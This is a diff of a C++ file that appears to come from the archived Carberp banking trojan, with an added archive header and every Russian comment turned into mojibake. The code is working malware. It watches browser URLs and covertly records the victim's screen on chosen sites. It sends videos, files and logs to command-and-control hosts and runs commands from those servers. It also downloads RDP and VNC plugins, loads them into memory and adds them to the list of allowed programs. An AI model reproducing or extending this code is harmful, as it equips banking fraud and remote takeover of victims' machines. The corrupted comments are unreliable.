@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "VideoRecorder.h"
 #include "BotCore.h"
 #include "Memory.h"
@@ -20,14 +31,14 @@ namespace VIDEORECDEBUGSTRINGS
 	#include "DbgTemplates.h"
 }
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define VDRDBG VIDEORECDEBUGSTRINGS::DBGOutMessage<>
 
 //----------------------------------------------------------------------------
 
 
-/// список отлавливаемых адресов. В случае рабочей копии должен заканчиваться
-//  двойным нулём
+/// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 #ifndef DEBUGCONFIG
 	char VIDEO_REC_URLS[VIDEOREC_PARAM_SIZE_URLS] = VIDEOREC_PARAM_NAME_URLS;
 #else
@@ -53,7 +64,7 @@ namespace VIDEORECDEBUGSTRINGS
 //	char VIDEO_REC_HOST1[] = "192.168.147.2";
 //	char VIDEO_REC_HOST2[] = "193.106.161.242";
 #else
-	//Адрес сервера куда пишем видео
+	//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	char VIDEO_REC_HOST1[VIDEOREC_PARAM_SIZE_HOST] = VIDEOREC_PARAM_NAME_HOST1;
 	char VIDEO_REC_HOST2[VIDEOREC_PARAM_SIZE_HOST] = VIDEOREC_PARAM_NAME_HOST2;
 #endif
@@ -64,7 +75,7 @@ namespace VIDEORECDEBUGSTRINGS
 
 namespace VideoRecorder
 {
-	// Подключаем код библиотеки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	#include "VideoRecorderDll.cpp"
 }
 
@@ -75,7 +86,7 @@ namespace VideoRecorder
 TVideoRecDLL::TVideoRecDLL()
 	: TMemoryDLL(VideoRecorder::data)
 {
-	// Загружаем библиотеку и инициализируем апи
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	InitializeApi();
 }
 //-------------------------------------------------------------------
@@ -88,8 +99,8 @@ TVideoRecDLL::~TVideoRecDLL()
 
 void TVideoRecDLL::LoadFunc(const char* Name, LPVOID &Addr)
 {
-	// Функция загружает функцию библиотеки
-	// Функция расчитывает на то, что строка Name зашифрована
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Name пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Addr = GetProcAddress(GetStr(Name));
 }
 //-------------------------------------------------------------------
@@ -116,10 +127,10 @@ void TVideoRecDLL::InitializeApi()
 //*********************************************************************************
 //							VideoSendLog
 //*********************************************************************************
-//отправка лога на сервер:
-//name - имя лога
-//code - код лога
-//format - форматированный текст лога
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ:
+//name - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+//code - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+//format - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 void VideoLog::Send( const char* name, int code, const char* format, ... )
 {
 	if( format != 0 )
@@ -150,7 +161,7 @@ void VideoLog::Send( int code, const char* format, ... )
 
 void WINAPI IEURLChanged(PKeyLogger, DWORD EventID, LPVOID Data)
 {
-	// Проверяем адрес в браузере и, в случае нужного, запускаем запись
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (CalcHash(VIDEO_REC_URLS) == HASH_VIDEO_REC_URLS)
 		return;
 
@@ -168,8 +179,8 @@ void WINAPI IEURLChanged(PKeyLogger, DWORD EventID, LPVOID Data)
 			}
 
 			//--------------------
-			Temp = STR::End(Temp); // Переходим к концу строки
-			Temp++;                // Пропускаем нулевой символ
+			Temp = STR::End(Temp); // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+			Temp++;                // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		}
     }
 
@@ -188,7 +199,7 @@ void WINAPI IEURLChanged(PKeyLogger, DWORD EventID, LPVOID Data)
 void StartVideoFromCurrentURL()
 {
 	#ifdef UniversalKeyLoggerH
- 		VDRDBG("VideoRecorder", "Инициализируем видеорекордер для записи при нужных адресах");
+ 		VDRDBG("VideoRecorder", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 		KeyLogger::Initialize(NULL);
 		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, IEURLChanged);
@@ -198,7 +209,7 @@ void StartVideoFromCurrentURL()
 
 PCHAR GetVideoRecHost1()
 {
-	//Функция возвращает адрес сервера для записи видео
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (CalcHash(VIDEO_REC_HOST1) == HASH_VIDEO_REC_HOST)
 		return NULL;
 
@@ -207,7 +218,7 @@ PCHAR GetVideoRecHost1()
 
 PCHAR GetVideoRecHost2()
 {
-	//Функция возвращает адрес сервера для записи видео
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (CalcHash(VIDEO_REC_HOST2) == HASH_VIDEO_REC_HOST)
 		return NULL;
 
@@ -237,21 +248,21 @@ bool SaveVideoDll( const char* nameFile )
 namespace VideoProcess
 {
 
-TVideoRecDLL* dll; //экземпляр либы
-PProcessPipe pipe; //канал пайпа
-const int MaxServers = 10; //максимальное количество обновременно работающих серверов 
+TVideoRecDLL* dll; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+PProcessPipe pipe; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+const int MaxServers = 10; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
 DWORD servers[MaxServers];
 
 DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData );
 
-//инициализация (запуск) нового менеджера 
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅ) пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
 struct MsgInit
 {
 	char ip[24];
 	int port;
 	int flags;
-	int downtime; //время бездействия после которого менеджер уходит в режим спячки
-	int numServer; //номер сервера (индекс в servers), 
+	int downtime; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	int numServer; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ servers), 
 };
 
 static void WINAPI HandlerInit( LPVOID Data, PPipeMessage Message, bool &Cancel )
@@ -261,7 +272,7 @@ static void WINAPI HandlerInit( LPVOID Data, PPipeMessage Message, bool &Cancel 
 	MsgInit* mi = (MsgInit*)Message->Data;
 	VDRDBG( "Video", "init server: ip: %s:%d, downtime %d", mi->ip, mi->port, mi->downtime );
 	int num = -1;
-	for( int i = 0; i < MaxServers; i++ ) //ищем свободное место в массиве серверов
+	for( int i = 0; i < MaxServers; i++ ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if( servers[i] == 0 )
 			num = i;
 	if( num >= 0 )
@@ -270,17 +281,17 @@ static void WINAPI HandlerInit( LPVOID Data, PPipeMessage Message, bool &Cancel 
 		if( id )
 		{
 			int i = 0;
-			for( ; i < MaxServers; i++ ) //смотрим может уже инициализирован такой сервер
+			for( ; i < MaxServers; i++ ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				if( servers[i] == id )
 				{
 					num = i;
 					break;
 				}
-			if( i >= MaxServers ) //такой сервер не подключен
+			if( i >= MaxServers ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			{
 				servers[num] = id;
 				if( mi->flags & TVideoRecDLL::RunCallback )
-					dll->RunCmdExec( id, CallbackCmd ); //запуск потока выполнения команд от сервера
+					dll->RunCmdExec( id, CallbackCmd ); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			}
 		}
 		else
@@ -293,7 +304,7 @@ int Init( int flags, const char* ip, int port, int downtime )
 {
 	MsgInit msg;
 	SafeCopyStr( msg.ip, sizeof(msg.ip), ip );
-	if( msg.ip[0] == 0 ) //сервер не указан берем по умолчанию
+	if( msg.ip[0] == 0 ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		m_lstrcpy( msg.ip, VIDEO_REC_HOST1 );
 	msg.port = port == 0 ? VIDEORECORD_DEFAULT_PORT : port;
 	msg.flags = flags;
@@ -303,7 +314,7 @@ int Init( int flags, const char* ip, int port, int downtime )
 	return msg.numServer;
 }
 
-//обновление настроек сервера
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 struct MsgUpdateSettings
 {
 	int setFlags;
@@ -336,17 +347,17 @@ void UpdateSettings( int server, int setFlags, int resetFlags, int downtime )
 	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecUpdateSettings).t_str(), (char*)&msg, sizeof(msg), 0 );
 }
 
-//сообщение для записи видео
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 struct MsgRecordVideo
 {
-	char nameVideo[128]; //имя видео
-	HWND wnd; //если != 0, то запись указанного окна
-	DWORD pid; //если != 0, то запись с окон указанного процесса
-	int flags; //0x0001 - полноэкранная запись, 0x0002 - записывать всегда, даже если окно не активно
-	int seconds; //сколько секунд писать видео
+	char nameVideo[128]; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	HWND wnd; //пїЅпїЅпїЅпїЅ != 0, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	DWORD pid; //пїЅпїЅпїЅпїЅ != 0, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	int flags; //0x0001 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, 0x0002 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	int seconds; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	int numServer;
 };
-//функция обработчик стартует запись видео
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 static void WINAPI HandlerRecordVideo( LPVOID Data, PPipeMessage Message, bool &Cancel )
 {
 	if( Message->DataSize != sizeof(VideoProcess::MsgRecordVideo) ) 
@@ -391,7 +402,7 @@ bool RecordPID( int server, const char* name, DWORD pid, int seconds, int flags 
 	return true;
 }
 
-//функция обработчик останавливает запись видео
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 static void WINAPI HandlerStopRecord( LPVOID Data, PPipeMessage Message, bool &Cancel )
 {
 	VDRDBG( "Video", "stop video" );
@@ -406,18 +417,18 @@ void RecordStop()
 }
 
 ///////////////////////////////////////////////////////////////////////////////////////
-//сообщение для записи файлов
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 struct MsgSendFiles
 {
-	char name[MAX_PATH]; //имя записи
-	char path[MAX_PATH]; //имя файла или папка которые нужно передать
+	char name[MAX_PATH]; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	char path[MAX_PATH]; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int numServer;
-	int flags; //1 - удаление файла после отправки
-	int after; //через сколько секунд начать отправку
-	DWORD id; //идентификатор отправки (для проверки в асинхронной отправки)
+	int flags; //1 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	int after; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	DWORD id; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 };
 
-//стартует передачу файлов на сервер
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 static void WINAPI HandlerSendFiles( LPVOID Data, PPipeMessage Message, bool &Cancel )
 {
 	if( Message->DataSize != sizeof(MsgSendFiles) ) return;
@@ -427,7 +438,7 @@ static void WINAPI HandlerSendFiles( LPVOID Data, PPipeMessage Message, bool &Ca
 		msg->id = dll->StartSendAsync( servers[msg->numServer], msg->name, msg->path, msg->flags, msg->after );
 }
 
-//проверка на наличие данной закачки
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static void WINAPI HandlerFolderIsUpload( LPVOID Data, PPipeMessage Message, bool &Cancel )
 {
 	if( Message->DataSize != sizeof(MsgSendFiles) ) return;
@@ -468,14 +479,14 @@ bool FolderIsUpload( const char* name, const char* folder )
 	return false;
 }
 //////////////////////////////////////////////////////////////////
-//проверка окончания передачи файлов
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 struct MsgFilesIsSended
 {
 	DWORD id;
 	DWORD res;
 };
 
-//проверяет закончилась ли отправка файлов
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 static void WINAPI HandlerFilesIsSended( LPVOID Data, PPipeMessage Message, bool &Cancel )
 {
 	if( Message->DataSize != sizeof(MsgFilesIsSended) ) return;
@@ -497,13 +508,13 @@ bool FilesIsSended(DWORD id)
 
 struct MsgSendLog
 {
-	char name[128]; //имя лога
-	int code; //кода текста лога
-	char text[4096 - 256]; //текст лога (большего размера нельзя из-за ограничения размеров отправляемых на сервер пакетов)
+	char name[128]; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	int code; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	char text[4096 - 256]; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 	int numServer;
 };
 
-//отсылка лога на сервер
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 static void WINAPI HandlerSendLog( LPVOID Data, PPipeMessage Message, bool &Cancel )
 {
 	if( Message->DataSize != sizeof(MsgSendLog) ) return;
@@ -521,7 +532,7 @@ static DWORD WINAPI SendLogThread( void* msg )
 	return 0;
 }
 
-//лог отправляет в отдельном потоке, чтобы не было задержки
+//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 bool SendLog( int server, const char* name, int code, const char* text )
 {
 	MsgSendLog* msg = (MsgSendLog*)MemAlloc( sizeof(MsgSendLog) );
@@ -538,7 +549,7 @@ struct MsgOutOfHibernation
 	int numServer;
 };
 
-//отсылка лога на сервер
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 static void WINAPI HandlerOutOfHibernation( LPVOID Data, PPipeMessage Message, bool &Cancel )
 {
 	if( Message->DataSize != sizeof(MsgOutOfHibernation) ) return;
@@ -556,7 +567,7 @@ static DWORD WINAPI OutOfHibernationThread( void* msg )
 	return 0;
 }
 
-//вывод видео длл из спячки, работает в отдельно потоке, чтобы не было задержки
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 void OutOfHibernation( int server )
 {
 	MsgOutOfHibernation* msg = (MsgOutOfHibernation*)MemAlloc( sizeof(MsgOutOfHibernation) );
@@ -572,13 +583,13 @@ DWORD WINAPI ProcessRDP(void*)
 	typedef int (WINAPIV* PTakeBotGuid)(char*boot_guid);
 
 	BOT::Initialize(ProcessUnknown);
-	VDRDBG( "Video", "Запущен процесс RDP" );
+	VDRDBG( "Video", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ RDP" );
 	DWORD c_data;
 	BYTE* data = Plugin::Download( "rdp.plug", 0, &c_data, false );
 	//BYTE* data = File::ReadToBufferA( "c:\\rdp.dll", c_data );
 	if( data )
 	{
-		VDRDBG( "Video", "RDP плагин загружен" );
+		VDRDBG( "Video", "RDP пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		HMEMORYMODULE module = MemoryLoadLibrary(data);
 		if( module )
 		{
@@ -590,13 +601,13 @@ DWORD WINAPI ProcessRDP(void*)
 			{
 				VDRDBG( "Video", "Init RDP" );
 				Init(GetStr(RDPRunParam).t_str());
-				HANDLE mutex = CaptureMutex( "RDP", 10000 ); //сообщаем что RDP запустился
+				HANDLE mutex = CaptureMutex( "RDP", 10000 ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ RDP пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				VDRDBG( "Video", "RDP before start" );
 				Start();
 				VDRDBG( "Video", "RDP after start" );
 				if( mutex )
 				{
-					for(;;) // ждем команды на выключение
+					for(;;) // пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					{
 						HANDLE tmp;
 						tmp = (HANDLE)pOpenMutexA( MUTEX_ALL_ACCESS, false, "DllStop" );
@@ -621,7 +632,7 @@ DWORD WINAPI ProcessVNC(void*)
 {
 	BOT::Initialize(ProcessUnknown);
 
-	VDRDBG("Video", "Запущен процесс VNC. PID %d", Bot->PID());
+	VDRDBG("Video", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ VNC. PID %d", Bot->PID());
 
 	DWORD c_data;
 	BYTE* data = Plugin::Download( "vnc.plug", 0, &c_data, false );
@@ -634,13 +645,13 @@ DWORD WINAPI ProcessVNC(void*)
 		File::GetTempName(fileName);
 		if( File::WriteBufferA(fileName, data, c_data) == c_data)
 		{
-			AddAllowedprogram(fileName); //добавляем в список разрешенных
+			AddAllowedprogram(fileName); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			VDRDBG( "Video", "vnc.plug saved in %s", fileName );
 			if( RunFileA(fileName))
 			{
 				pMoveFileExA( fileName, 0, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
-				pSleep(20000); //ждем 20 с пока запустится vnc
-				HANDLE mutex = CaptureMutex( "VNC", 10000 ); //сообщаем что VNC запустился
+				pSleep(20000); //пїЅпїЅпїЅпїЅ 20 пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ vnc
+				HANDLE mutex = CaptureMutex( "VNC", 10000 ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ VNC пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				if( mutex )
 				{
 					while (true)
@@ -675,17 +686,17 @@ DWORD WINAPI ProcessVNC(void*)
 
 struct VNCDLL_CONTEXT
 {
-	ULONGLONG	pModule32;	// указатель на загруженный в память файл, содержащий 32х-битную версию DLL
-	ULONGLONG	pModule64;	// указатель на загруженный в память файл, содержащий 64х-битную версию DLL
-	ULONG		Module32Size;	// размер файла 32х-битной DLL
-	ULONG		Module64Size;	// размер файла 64х-битной DLL
